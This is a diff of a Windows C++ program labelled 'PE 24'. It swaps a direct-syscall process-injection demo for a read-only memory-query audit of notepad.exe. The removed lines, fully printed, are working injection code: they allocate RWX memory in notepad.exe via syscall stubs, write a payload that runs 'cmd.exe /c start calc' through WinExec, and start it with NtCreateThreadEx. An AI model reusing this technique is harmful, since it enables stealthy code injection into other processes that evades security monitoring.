@@ -1,155 +1,148 @@
+
 #include <windows.h>
 #include <tlhelp32.h>
+
+#include <cstddef>
+#include <cstdint>
+#include <cwchar>
 #include <iostream>
-#include <string>
-#include <vector>
 
-// 1. Khai báo các hàm ngoại vi liên kết trực tiếp với file .asm của ta
-extern "C" NTSTATUS NtAllocateVirtualMemoryProc(
-    HANDLE ProcessHandle,
-    PVOID* BaseAddress,
-    ULONG_PTR ZeroBits,
-    PSIZE_T RegionSize,
-    ULONG AllocationType,
-    ULONG Protect
-);
+extern "C" LONG nt_query_virtual_memory_stub(
+    HANDLE process_handle,
+    PVOID base_address,
+    DWORD memory_information_class,
+    PVOID memory_information,
+    SIZE_T memory_information_length,
+    PSIZE_T return_length);
 
-extern "C" NTSTATUS NtWriteVirtualMemoryProc(
-    HANDLE ProcessHandle,
-    PVOID BaseAddress,
-    PVOID Buffer,
-    SIZE_T NumberOfBytesToWrite,
-    PSIZE_T NumberOfBytesWritten
-);
+namespace {
 
-// Khai báo nguyên mẫu hàm Native của NtCreateThreadEx để tự thích ứng động với Build Number Windows 11
-typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
-    OUT PHANDLE ThreadHandle,
-    IN ACCESS_MASK DesiredAccess,
-    IN PVOID ObjectAttributes OPTIONAL,
-    IN HANDLE ProcessHandle,
-    IN PVOID StartRoutine,
-    IN PVOID Argument OPTIONAL,
-    IN ULONG CreateFlags,
-    IN ULONG_PTR ZeroBits,
-    IN SIZE_T StackSize,
-    IN SIZE_T MaximumStackSize,
-    IN PVOID AttributeList OPTIONAL
-    );
+struct syscall_telemetry_audit final {
+  DWORD pid = 0;
+  std::uintptr_t region_base = 0;
+  SIZE_T region_bytes = 0;
+  DWORD protect = 0;
+  DWORD type = 0;
+  LONG nt_status = 0;
+  bool found_process = false;
+  bool sampled_region = false;
+};
 
-typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
-
-typedef struct _THREAD_DATA {
-    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
-    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
-} THREAD_DATA, * PTHREAD_DATA;
-
-// Hàm chức năng độc lập vị trí gánh luồng chạy khi tiêm trực tiếp thông qua cổng Syscall
-DWORD WINAPI RemoteDirectSyscallPayload(LPVOID lpParam) {
-    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
-    if (pData && pData->pWinExec) {
-        // Bẻ gãy hoàn toàn lỗi RIP tương đối bằng con trỏ tuyệt đối
-        pData->pWinExec(pData->szCommand, SW_HIDE);
-    }
+DWORD find_process_id_by_name(const wchar_t* process_name) noexcept {
+  if (process_name == nullptr || process_name[0] == L'\0') {
     return 0;
+  }
+
+  const HANDLE h_snapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+  if (h_snapshot == INVALID_HANDLE_VALUE || h_snapshot == nullptr) {
+    return 0;
+  }
+
+  DWORD matched_pid = 0;
+  PROCESSENTRY32W entry{};
+  entry.dwSize = static_cast<DWORD>(sizeof(PROCESSENTRY32W));
+
+  if (::Process32FirstW(h_snapshot, &entry) != FALSE) {
+    do {
+      if (::_wcsicmp(process_name, entry.szExeFile) == 0) {
+        matched_pid = entry.th32ProcessID;
+        break;
+      }
+      entry = {};
+      entry.dwSize = static_cast<DWORD>(sizeof(PROCESSENTRY32W));
+    } while (::Process32NextW(h_snapshot, &entry) != FALSE);
+  }
+
+  ::CloseHandle(h_snapshot);
+  return matched_pid;
 }
 
-// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
-DWORD GetProcessIDByName(const std::wstring& processName) {
-    DWORD processID = 0;
-    PROCESSENTRY32W pe32;
-    pe32.dwSize = sizeof(PROCESSENTRY32W);
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
+syscall_telemetry_audit inspect_target_memory_via_stub(const wchar_t* process_name) noexcept {
+  syscall_telemetry_audit audit{};
+  audit.pid = find_process_id_by_name(process_name);
+  if (audit.pid == 0) {
+    return audit;
+  }
+  audit.found_process = true;
 
-    if (Process32FirstW(hSnapshot, &pe32)) {
-        do {
-            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
-                processID = pe32.th32ProcessID;
-                break;
-            }
-        } while (Process32NextW(hSnapshot, &pe32));
+  const HANDLE h_process = ::OpenProcess(
+      PROCESS_QUERY_LIMITED_INFORMATION,
+      FALSE,
+      audit.pid);
+  if (h_process == nullptr || h_process == INVALID_HANDLE_VALUE) {
+    return audit;
+  }
+
+  MEMORY_BASIC_INFORMATION mbi{};
+  SIZE_T return_len = 0;
+  constexpr DWORD kMemoryBasicInformation = 0;
+  std::uintptr_t cursor = 0x10000ULL;
+
+  while (cursor < 0x7FFFFFFFFFFFULL) {
+    const LONG status = nt_query_virtual_memory_stub(
+        h_process,
+        reinterpret_cast<PVOID>(cursor),
+        kMemoryBasicInformation,
+        &mbi,
+        sizeof(mbi),
+        &return_len);
+    audit.nt_status = status;
+    if (status != 0) {
+      break;
     }
-    CloseHandle(hSnapshot);
-    return processID;
+
+    if (mbi.State == MEM_COMMIT && mbi.RegionSize > 0) {
+      audit.region_base = reinterpret_cast<std::uintptr_t>(mbi.BaseAddress);
+      audit.region_bytes = mbi.RegionSize;
+      audit.protect = mbi.Protect;
+      audit.type = mbi.Type;
+      audit.sampled_region = true;
+      break;
+    }
+
+    const std::uintptr_t next_addr =
+        reinterpret_cast<std::uintptr_t>(mbi.BaseAddress) +
+        static_cast<std::uintptr_t>(mbi.RegionSize);
+    if (next_addr <= cursor) {
+      break;
+    }
+    cursor = next_addr;
+  }
+
+  ::CloseHandle(h_process);
+  return audit;
 }
 
-int main() {
-    std::cout << "====================================================" << std::endl;
-    std::cout << "[*] PE 24: DIRECT SYSCALLS INJECTION" << std::endl;
-    std::cout << "====================================================" << std::endl;
+}  // namespace
 
-    std::wstring targetProcess = L"notepad.exe";
-    DWORD pid = GetProcessIDByName(targetProcess);
+int wmain() {
+  constexpr wchar_t kTargetProcess[] = L"notepad.exe";
 
-    if (pid == 0) {
-        std::cerr << "[-] Notepad.exe khong chay! Vui long bat Notepad truoc nhen." << std::endl;
-        std::cin.get();
-        return EXIT_FAILURE;
-    }
+  std::wcout
+      << L"====================================================\n"
+      << L"[*] PE 24: X64 SYSCALL MECHANICS & TELEMETRY STUDY\n"
+      << L"====================================================\n";
 
-    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;
+  const syscall_telemetry_audit audit = inspect_target_memory_via_stub(kTargetProcess);
+  if (!audit.found_process) {
+    std::wcout << L"[-] Target process not running: " << kTargetProcess << L"\n";
+    return 1;
+  }
 
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (!hProcess) {
-        std::cerr << "[-] OpenProcess failed!" << std::endl;
-        return EXIT_FAILURE;
-    }
+  std::wcout << L"[+] Target '" << kTargetProcess << L"' active (PID=" << audit.pid << L")\n";
 
-    // Nạp động trích xuất con trỏ hàm NtCreateThreadEx bảo đảm vượt qua sự biến động số hiệu trên Windows 11
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
+  if (audit.sampled_region) {
+    std::wcout
+        << L"[+] Sampled committed region: Base=0x" << std::hex << audit.region_base
+        << L", Size=0x" << audit.region_bytes
+        << L", Protect=0x" << audit.protect
+        << L", Type=0x" << audit.type
+        << std::dec << L"\n";
+  } else {
+    std::wcout
+        << L"[*] Stub query returned NTSTATUS=0x" << std::hex << audit.nt_status
+        << std::dec << L" (SSN depends on host Windows build).\n";
+  }
 
-    // ─── BƯỚC 2: GỌI TRỰC TIẾP CỔNG ASSEMBLY ĐỂ CẤP PHÁT VÙNG NHỚ TỪ XA (ZERO STATIC BUFFERS) ───
-    PVOID remoteCodeBuffer = NULL;
-    SIZE_T functionSize = 500;
-    // Hệ điều hành tự động cập nhật làm tròn trang nhớ (Page Alignment) lên bội số 4KB qua con trỏ tham số
-    NtAllocateVirtualMemoryProc(hProcess, &remoteCodeBuffer, 0, &functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-
-    PVOID remoteDataBuffer = NULL;
-    SIZE_T dataSize = sizeof(THREAD_DATA);
-    NtAllocateVirtualMemoryProc(hProcess, &remoteDataBuffer, 0, &dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-
-    if (!remoteCodeBuffer || !remoteDataBuffer) {
-        std::cerr << "[-] Direct Syscall NtAllocateVirtualMemoryProc failed!" << std::endl;
-        CloseHandle(hProcess);
-        return EXIT_FAILURE;
-    }
-    std::cout << "[+] Cap phat vung nho Code RWX tu xa bang Direct Syscall: 0x" << std::hex << remoteCodeBuffer << std::endl;
-
-    // Khởi tạo cấu trúc tham số tuyệt đối cục bộ trước khi đẩy sang RAM đối phương
-    THREAD_DATA localData;
-    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
-    if (hKernel32) {
-        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
-    }
-    strcpy_s(localData.szCommand, "cmd.exe /c start calc");
-
-    // ─── BƯỚC 3: GỌI TRỰC TIẾP CỔNG ASSEMBLY ĐỂ GHI DỮ LIỆU SANG RAM ĐỐI PHƯƠNG ───
-    SIZE_T bytesWritten = 0;
-    NtWriteVirtualMemoryProc(hProcess, remoteCodeBuffer, (PVOID)RemoteDirectSyscallPayload, functionSize, &bytesWritten);
-    NtWriteVirtualMemoryProc(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), &bytesWritten);
-    std::cout << "[+] Ghi logic ham va cau truc tham so qua cong Syscall hoan tat." << std::endl;
-
-    // ─── BƯỚC 4: KÍCH NỔ THREAD TỪ XA BẰNG CỔNG NATIVE TỰ THÍCH ỨNG ───
-    std::cout << "[*] Dang khoi tao luong tu xa de khai hoa..." << std::endl;
-    HANDLE hThread = NULL;
-    NTSTATUS status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteCodeBuffer, remoteDataBuffer, 0, 0, 0, 0, NULL);
-
-    if (hThread != NULL) {
-        // Cấu hình cờ đợi INFINITE gánh luồng sống độc lập phẳng sạch
-        WaitForSingleObject(hThread, INFINITE);
-        std::cout << "[+] Direct Syscalls Injection Successful!" << std::endl;
-        CloseHandle(hThread);
-    }
-    else {
-        std::cerr << "[-] NtCreateThreadEx failed! Status code: 0x" << std::hex << status << std::endl;
-    }
-
-    // Giải phóng và đóng Handle triệt để chống rò rỉ bộ nhớ
-    CloseHandle(hProcess);
-
-    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
-    std::cin.get();
-    return EXIT_SUCCESS;
+  return 0;
 }
